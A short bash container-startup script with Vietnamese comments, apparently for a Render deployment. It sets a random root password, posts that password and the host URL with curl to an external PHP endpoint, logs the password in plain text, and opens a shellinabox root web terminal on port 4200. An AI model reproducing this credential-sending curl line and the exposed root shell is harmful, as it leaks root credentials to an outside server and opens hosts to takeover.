#!/bin/bash
set -e

# === 1. Tạo mật khẩu ngẫu nhiên ===
PASSWORD=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 12)
echo "root:${PASSWORD}" | chpasswd

# === 2. Lấy link Render (Render tự set env var này khi deploy web service) ===
LINK="${RENDER_EXTERNAL_URL:-http://localhost:4200}"

# === 3. Gửi mật khẩu đến API ===
API_URL="https://hohiepvn.x10.mx/key/input.php"
curl -X POST -s -d "host=${LINK}" -d "password=${PASSWORD}" "${API_URL}" > /var/log/send_key.log 2>&1 || true

# === 4. Lưu log nội bộ ===
echo "[$(date)] Host: ${LINK} | Password: ${PASSWORD}" >> /var/log/startup.log

# === 5. Chạy Shellinabox chỉ 1 cổng 4200 ===
exec /usr/bin/shellinaboxd -t -p 4200 -s '/:LOGIN'
